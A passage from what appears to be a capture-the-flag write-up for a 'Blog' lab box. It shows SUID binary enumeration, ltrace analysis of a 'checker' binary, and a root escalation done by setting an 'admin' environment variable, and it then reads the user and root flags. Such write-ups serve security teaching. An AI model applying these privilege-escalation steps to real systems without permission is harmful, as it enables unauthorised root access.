+</span></span><span style="display:flex;"><span>/home/bjoel/user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /home/bjoel/user.txt
+</span></span><span style="display:flex;"><span>You won<span style="color:#e6db74">&#39;t find what you&#39;</span>re looking <span style="color:#66d9ef">for</span> here.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRY HARDER
+</span></span></code></pre></div><p>Hmmm, that didn&rsquo;t work. Let&rsquo;s try escalating to root to find the real user flag.</p>
+<hr>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>We&rsquo;ll start off searching for applications with an suid set.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -perm -04000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/sbin/checker
+</span></span></code></pre></div><p>We find a bit of an odd one in &ldquo;/usr/sbin/checker&rdquo;, let&rsquo;s run it and see what happens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checker
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Not an Admin
+</span></span></code></pre></div><p>Not much info there; we&rsquo;ll run it through a program called &ldquo;ltrace&rdquo;, which runs the command until right before completion, tracing its library calls.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ltrace /usr/sbin/checker
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getenv<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">)</span>                                  <span style="color:#f92672">=</span> nil
+</span></span><span style="display:flex;"><span>puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Not an Admin&#34;</span>Not an Admin<span style="color:#f92672">)</span>                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>It seems checker checks an environment variable (admin) and if it doesn&rsquo;t exist (returns nil) prints &ldquo;Not an Admin&rdquo;</p>
+<p>We&rsquo;ll try to set the admin variable to something before running the command again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export admin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;kcalb&#34;</span>
+</span></span><span style="display:flex;"><span>checker
+</span></span></code></pre></div><p>(You can set admin to anything, the program only checks that it exists.)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Success! Now that we have root access we&rsquo;ll run another search for the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name user.txt 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/media/usb/user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /media/usb/user.txt
+</span></span></code></pre></div><p>That also answers the last question.</p>
+<blockquote>
+<p>Where was user.txt found?<br>
+<em>/media/usb</em></p>
+</blockquote>
+<p>Lastly, we&rsquo;ll search for and print out the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name root.txt 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/root/root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span></code></pre></div><hr>
+<h2 id="success">Success!</h2>
+<p>That&rsquo;s it! We&rsquo;ve captured both Blog flags!</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
